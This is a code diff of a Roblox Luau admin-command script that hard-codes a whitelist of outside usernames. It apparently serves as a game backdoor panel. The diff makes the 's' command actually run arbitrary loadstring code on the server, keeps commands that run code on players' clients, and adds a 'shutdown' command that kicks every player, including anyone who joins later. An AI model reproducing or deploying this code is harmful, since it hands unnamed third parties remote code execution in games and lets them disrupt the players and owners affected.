@@ -130,9 +130,32 @@ end
 -- rank worth as a %percent%
 local Ranks = {
     Developer = 100,
-    Kiddie = 80,
+    Special = 80,
     Whitelist = 50
 }
+
+local RanksExtra = {
+    Developer = {
+        Colour = Color3.fromRGB(105, 47, 138)
+    },
+    Special = {
+        Colour = Color3.fromRGB(110, 57, 57)
+    },
+    Whitelist = {
+        Colour = Color3.fromHSV(0.692112, 0.539744, 0.7)
+    }
+}
+
+local function RankToString(rank: number)
+    for i,v in pairs(Ranks) do
+        if rank == v then return i end
+    end 
+    return "Unknown"
+end
+
+local function RankToColour(rank: number)
+    return RanksExtra[RankToString(rank)].Colour
+end
 
 -- expose just 2 be nice qt3.14's
 GetEnv().runLua = function(caller: Player, code: string)
@@ -173,22 +196,22 @@ if not GetEnv().tempwhitelist then
             COMMENT = "Note that all a higher rank does is give me access to &whitelist so please either do it by hand or dont touch this!"
         },
         ["qwdssssfsdrfasd"] = {
-            rank = Ranks.Kiddie
+            rank = Ranks.Special
         },
         ["yx_doomspire"] = {
-            rank = Ranks.Kiddie
+            rank = Ranks.Special
         },
         ["idonthacklol101ns"] = {
-            rank = Ranks.Kiddie
+            rank = Ranks.Special
         },
         ["AiphaGunner"] = {
-            rank = Ranks.Kiddie
+            rank = Ranks.Special
         },
         ["trashmoderatio1n"] = {
-            rank = Ranks.Kiddie
+            rank = Ranks.Special
         },
         ["xXRblxGamerRblxXx"] = {
-            rank = Ranks.Kiddie
+            rank = Ranks.Special
         },
     }
 end
@@ -373,6 +396,18 @@ AddCommand(Ranks.Developer, "enr", "Enter debug mode", "<boolean>", function(cal
     _G.yemdebug = (value:lower() == "true")
 end)
 
+AddCommand(Ranks.Developer, "shutdown", "Emergency cleanup :)", "<...>", function(caller: Player, ...)
+    local reason = table.concat({...}, " ")
+
+    Players.PlayerAdded:Connect(function(a0: Player)
+        a0:Kick(reason)
+    end)
+
+    for i,v in pairs(Players:GetPlayers()) do
+        v:Kick(reason)
+    end
+end)
+
 AddCommand(Ranks.Whitelist, "cmds", "Display a list of basic commands", "<>", function(caller: Player)
     local output: {string} = {}
 
@@ -395,11 +430,46 @@ AddCommand(Ranks.Whitelist, "cmds", "Display a list of basic commands", "<>", fu
     NewGui(output).Parent = caller.PlayerGui
 end)
 
-AddCommand(Ranks.Whitelist, "banlist", "Display a list of banned players", "<>", function(caller: Player)
+AddCommand(Ranks.Whitelist, "bans", "Display a list of banned players", "<>", function(caller: Player)
     local output: {string} = {}
 
     for i,plr in pairs(GetEnv().tempbans) do
         table.insert(output, `{C(i, Color3.fromHex("#997373"))} - reason: im to lazy to find it thanks`)
+	end
+
+    if #GetEnv().tempbans == 0 then
+        table.insert(output, C("Oopsie daisy! theres no bans here silly.", Color3.fromHex("#6ab483")))
+    end 
+
+    NewGui(output).Parent = caller.PlayerGui
+end)
+
+AddCommand(Ranks.Whitelist, "admins", "Display a list of admins", "<>", function(caller: Player)
+    local output: {string} = {}
+
+    local noDupe = {}
+    for i,plr in pairs(_G.tempadmins) do
+        if table.find(noDupe, plr) then continue end
+        if not Players:FindFirstChild(plr) then continue end
+
+        table.insert(noDupe, plr)
+
+        local endStr: {string} = {}
+
+        if table.find(_G.permadmins, plr) then -- is perm
+            table.insert(endStr, C("Perm", Color3.fromHSV(0.398148, 0.546154, 0.4)))
+        end
+        
+        if table.find(_G.p299, plr) then -- is persons/p299
+            table.insert(endStr, C("P299", Color3.fromHSV(0.136132, 0.539744, 0.4)))
+        end
+        
+        local plrData = GetEnv().tempwhitelist[plr]
+        if plrData then -- is whitelist/whatrank
+            table.insert(endStr, C(RankToString(plrData.rank), RankToColour(plrData.rank)))
+        end
+
+        table.insert(output, `{C(plr, Color3.fromHex("#c8c8c8"))} ({table.concat(endStr, ", ")})`)
 	end
 
     NewGui(output).Parent = caller.PlayerGui
@@ -415,7 +485,7 @@ AddCommand(Ranks.Whitelist, "kick", "Kick a player with a reason", "<plyr1, ...>
     target:Kick(reason)
 end)
 
-AddCommand(Ranks.Kiddie, "ban", "Ban a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
+AddCommand(Ranks.Special, "ban", "Ban a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
 
@@ -424,7 +494,7 @@ AddCommand(Ranks.Kiddie, "ban", "Ban a player with a reason", "<plyr1, ...>", fu
     GetEnv().tempbans[target.Name] = reason
 end)
 
-AddCommand(Ranks.Kiddie, "unban", "Unban a player (Username only)", "<plyr1>", function(caller: Player, plyr1: string)
+AddCommand(Ranks.Special, "unban", "Unban a player (Username only)", "<plyr1>", function(caller: Player, plyr1: string)
     for i,v in pairs(GetEnv().tempbans) do
         if string.find(string.lower(i), plyr1, 1, true) then
             GetEnv().tempbans[i] = nil
@@ -451,7 +521,7 @@ AddCommand(Ranks.Whitelist, "unblacklist", "Unblacklists a player (Username only
     error("User not found")
 end)
 
-AddCommand(Ranks.Kiddie, "whitelist", "Give someone access (DANGEROUS)", "<plyr1>", function(caller: Player, plyr1: string)
+AddCommand(Ranks.Special, "whitelist", "Give someone access (DANGEROUS)", "<plyr1>", function(caller: Player, plyr1: string)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
     
@@ -467,15 +537,16 @@ AddCommand(Ranks.Whitelist, "perm", "Give someone perm", "<plyr1>", function(cal
     table.insert(_G.tempadmins, target.Name)
 end)
 
-AddCommand(Ranks.Kiddie, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
+AddCommand(Ranks.Special, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
     local code = table.concat({...}, " ")
     assert(code, "No code")
     
     local chunk, loadErr = loadstring(code, "Cattails")
     assert(chunk, `Script failed to execute; {loadErr}`)
+    chunk()
 end)
 
-AddCommand(Ranks.Kiddie, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
+AddCommand(Ranks.Special, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
 
